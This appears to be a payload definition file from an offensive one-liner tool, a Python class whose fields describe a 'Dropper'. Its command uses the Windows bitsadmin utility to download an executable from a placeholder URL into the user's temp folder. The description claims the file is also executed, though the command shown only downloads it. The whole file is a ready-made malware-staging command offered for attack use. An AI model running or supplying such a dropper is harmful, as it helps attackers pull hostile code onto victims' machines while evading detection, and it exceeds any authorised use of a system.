class info:
    author      = "Karim shoair (D4Vinci)"
    description = "Uses bitsadmin to download your exe file and execute."
    function    = "Dropper"
    liner       = "bitsadmin /transfer mydownloadjob /download /priority normal URL C:\\Users\\%USERNAME%\\AppData\\local\\temp\\xyz.exe"
